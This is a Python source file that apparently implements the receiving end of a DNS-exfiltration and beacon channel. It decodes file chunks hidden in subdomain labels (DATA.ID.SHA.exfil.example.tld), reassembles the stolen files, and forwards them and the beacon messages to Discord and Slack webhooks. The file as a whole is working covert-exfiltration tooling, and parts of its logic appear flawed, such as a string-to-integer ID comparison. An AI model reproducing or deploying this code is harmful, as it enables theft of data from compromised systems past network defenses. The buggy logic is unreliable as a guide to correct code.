import os, json
from datetime import datetime, timedelta
from dotenv import load_dotenv; load_dotenv()

import modules.database as db
import modules.queries  as queries

import modules.postoffice as Postoffice


# Global Variables
# For files, use a Database. Store recent messages in RAM. 
SEEN_SHA = {  } # SHA : file_id
COOLDOWN = {  } # Message : timestamp


#
#   Interface
#

def handle_exfil( domain : str, decode_function, webhooks : list ):
    """
    Parse & Handle the exfiltrated data received from the Domain Lookup.
    Will send the result to Discord, if a Discord webhook is provided.
    """
    
    global SEEN_SHA
    
    #  Domain format for Exfil:
    #      DATA_PART.ID_PART.SHA_PART.exfil.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          First request:     Should include the filename for storing and size. 
    #          Second and onward: Should include the sliced up data for storing.
    #          
    #      ID_PART (base62 encoded):
    #          The slices order number 1 .. N           
    #      
    #      SHA_PART:  
    #          The SHA1 for the file.
    #     
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    try:    
        data_part = subdomains[ 0 ]
        id_part   = subdomains[ 1 ]
        sha_part  = subdomains[ 2 ]
    except IndexError:
        return
    
    if str(id_part) == "0":
        data = deserialize_from_header(data_part, decode_function)
        
        filename = data["name"]
        filesize = data["size"]
        
        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )

        if file_id != []:
            return 
        
        db.insert_data(
            queries.insert_into_files,
            (filename, filesize, sha_part)
        )
    
        SEEN_SHA[ sha_part ] = db.query_database( queries.get_fileid_with_sha, (sha_part,) )
        
    if sha_part in SEEN_SHA and id_part != 0:
        
        # Insert chunks
        db.insert_data(
            queries.insert_into_filechunk,
            ( sha_part, id_part, data_part )
        )
        
        # Check if all chunks have been retrieved
        file_size    = db.query_database( queries.get_size_with_sha, (sha_part,) )[0][0]
        chunk_amount = db.query_database( queries.check_filechunks,  (sha_part,) )[0][0]
        if chunk_amount - 1 != file_size:
            return
        
        
        # If they're, reconstruct the file
        chunks     = db.query_database( queries.get_filechunks, (sha_part,) )
        all_chunks = "".join([(chunk[0], chunk[1])[1] for chunk in chunks])
        
            
        file_data = decode_function( all_chunks ) 
        file_name = db.query_database( queries.get_name_with_sha, (sha_part,) )[0][0]
            
        # Prevent duplicate send
        file_sent_previously = db.query_database( queries.get_sent_status )
        if file_sent_previously != []:
            return

        # Send the reconstructed file
        file_sent = Postoffice.send(
            webhooks,
            Postoffice.Discord_message( 
                files   = [ (file_name, file_data) ] 
            )
        )

        if not file_sent:
            print( "Error: Could not send message." )
            return
        
        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )[0][0]
        
        _ = db.insert_data(
            queries.insert_into_sentlog,
            (file_id,1)
        )
        
    
    return


def handle_beacon( domain : str, decode_function, webhooks ):
    """
    Parse & Handle the beacon data received from the Domain Lookup.
    Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
    """
    
    global COOLDOWN
    
    #  Domain format for Beacon:
    #      DATA_PART.beacon.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          Should include the transferable message or payload.
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    try:
        data_part = subdomains[ 0 ]
        message   = decode_function( data_part )
    except IndexError:
        return

    except UnicodeError:
        return

    send_message( message, webhooks )
    return

#
#   Implementation
#

def deserialize_from_header( chunk : str, decode_function  ):
    decoded = decode_function(chunk)
    data = json.loads(decoded)
    return data


def send_message( message : str, webhooks ):
    global COOLDOWN
    
    first_appearance = True
    if message in COOLDOWN:
        first_appearance = False
    
    if message not in COOLDOWN:
        COOLDOWN[ message ] = datetime.now()
    
    if (datetime.now() - COOLDOWN[ message ] >= timedelta(minutes=5)) or first_appearance:
        COOLDOWN[ message ] = datetime.now()
        Postoffice.send(
            webhooks,
            Postoffice.Slack_message( message ),
            Postoffice.Discord_message( message )
        )
    